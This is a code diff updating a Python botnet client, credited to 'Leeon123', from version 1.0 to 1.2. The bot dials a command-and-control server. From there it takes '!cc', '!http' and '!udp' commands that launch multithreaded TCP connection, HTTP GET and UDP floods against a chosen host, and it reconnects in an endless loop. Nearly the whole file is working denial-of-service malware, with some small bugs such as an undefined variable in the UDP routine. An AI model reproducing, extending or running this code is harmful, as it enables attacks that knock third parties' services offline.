@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 #Code By Leeon123
 
-#-- Python Bot version v1.0 --#
+#-- Python Bot version v1.2 --#
 
 import argparse
 import socket
@@ -12,7 +12,8 @@ from multiprocessing import Process
 import random
 import threading
 
-curProcess = None
+cnc   = str("127.0.0.1")#your cnc ip
+cport = int(80)#your cnc port
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -29,11 +30,11 @@ useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firef
 			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
 			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
 			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
-      "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
-      "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
-      "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
-      "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
-      "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",]
+			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
+			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
+			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
+			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
+			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",]
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -52,107 +53,122 @@ acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
-tcpbytes = random._urandom(1024) #For the tcp and udp flood
-udpbytes = random._urandom(512)
+stop = False
+def HTTP(ip, port, path):
+	global stop
+	while True:
+		if stop :
+			break
+		get_host = "GET "+path+"?"+str(random.randint(0,50000))+" HTTP/1.1\r\nHost: " + ip + "\r\n"
+		connection = "Connection: Keep-Alive\r\n"
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+		accept = random.choice(acceptall)
+		http = get_host + useragent + accept + connection + "\r\n"
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		try:
+			s.connect((str(ip), int(port)))
+			for y in range(100):
+				s.send(str.encode(http))
+			#s.close()
+		except:
+			s.close()
 
-def CC(ip, port, thread):
-    for x in range(100000000):#For a long time flooding
-        get_host = "GET / HTTP/1.1\r\nHost: " + ip + "\r\n"
-        connection = "Connection: Keep-Alive\r\n"
-        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-        accept = random.choice(acceptall)
-        http = get_host + useragent + accept + connection + "\r\n"
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((str(ip), int(port)))
-        for y in range(thread):
-            s.send(str.encode(http))
+def CC(ip, port):
+	global stop
+	while True:
+		if stop :
+			break
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((str(ip),int(port)))
+			s.send("\000".encode())
+			s.close()
+		except:
+			s.close()
 
-def tcpflood(ip, port, thread):
-    for x in range(100000000):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((str(ip),int(port)))
-        s.send(tcpbytes)
-        for y in range(thread):
-            s.send(tcpbytes)
-        s.close()
+def UDP(ip, port, size):
+	global stop
+	while True:
+		if stop :
+			break
+		udpbytes = random._urandom(int(size))
+		sendip=(str(ip),int(port))
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		try:
+			for y in range(thread):
+				s.sendto(udpbytes, sendip)
+			s.close()
+		except:
+			s.close()
 
-def udpflood(ip, port, thread):
-    for x in range(100000000):
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sendip=(str(ip),int(port))
-        for y in range(thread):
-            s.sendto(udpbytes, sendip)
-        s.close()
-
-def cmdHandle(sock, parser):#Now you know how does the bot handle the commands from cnc.py
-    global curProcess
-    while True:
-        data = sock.recv(1024).decode()
-        if len(data) == 0:
-            main()
-        if data[0] == '!':
-            try:
-                options = parser.parse_args(data[1:].split())
-
-                m_host = options.host
-                m_port = options.port
-                m_thread = options.threads
-                m_cmd = options.cmd
-
-                if m_cmd.lower() == 'cc':
-                    if curProcess !=None and curProcess.is_alive():
-                        curProcess.terminate()
-                        curProcess = None
-                    p = Process(target=CC, args = (m_host, m_port, m_thread))
-                    p.start()
-                    #print("CC Flood Start")
-                    curProcess = p
-                if m_cmd.lower() == 'tcp':
-                    if curProcess !=None and curProcess.is_alive():
-                        curProcess.terminate()
-                        curProcess = None
-                    p = Process(target=tcpflood, args = (m_host, m_port, m_thread))
-                    p.start()
-                    #print("TCP Flood Start")
-                    curProcess = p
-                if m_cmd.lower() == 'udp':
-                    if curProcess !=None and curProcess.is_alive():
-                        curProcess.terminate()
-                        curProcess = None
-                    p = Process(target=udpflood, args = (m_host, m_port, m_thread))
-                    p.start()
-                    #print("UDP Flood Start")
-                    curProcess = p
-                elif m_cmd.lower() == 'stop':
-                    if curProcess.is_alive():
-                        curProcess.terminate()
-            except:
-                pass
+def cmdHandle(sock):
+	global stop
+	attack = 0
+	sock.send("1337".encode())#login cnc
+	while True:
+		data = sock.recv(1024).decode()
+		if len(data) == 0:
+			main()
+		if data[0] == '!':
+			try:
+				command = data.split()
+				print(command)
+				if command[0] == '!cc':
+					if attack != 0:
+						stop = True
+						attack=0
+					if len(command) != 4 :
+						sock.send()
+					stop = False
+					for x in range(int(command[3])):
+						p = threading.Thread(target=CC, args=(command[1],command[2]))
+						p.start()
+					attack+=1
+				elif command[0] == '!http':
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for x in range(int(command[3])):
+						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
+						p.start()
+					attack+=1
+				elif command[0] == '!udp':
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for x in range(int(command[3])):
+						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
+						p.start()
+					attack+=1
+				elif command[0] == '!stop':
+					stop = True
+					attack = 0#clear attack list
+			except:
+				pass
+		if data == "ping":#ping
+			sock.send("pong".encode())#keepalive and check connection alive
 
 def main():
-	p = argparse.ArgumentParser()#Now you know how does the bot handle the commands from cnc.py
-	p.add_argument('-H', dest='host', type=str)
-	p.add_argument('-p', dest='port',type=int)
-	p.add_argument('-t', dest='threads',type=int)
-	p.add_argument('-c', dest='cmd', type=str)
-
+	
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-		s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive connection
-		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
-		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+		#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
+		#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
 		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)
-		s.connect(('127.0.0.1',1337))#Change your server ip and port
+		s.connect((cnc,cport))
 
-		cmdHandle(s, p)
+		cmdHandle(s)
 
 	except Exception as e:
-		connect()
+		connect()#magic loop
 
-def connect():#for a loop to connect the server until this script break.
+def connect():
 	time.sleep(5)
 	main()
 
 if __name__ == '__main__':
-    main()
+	main()
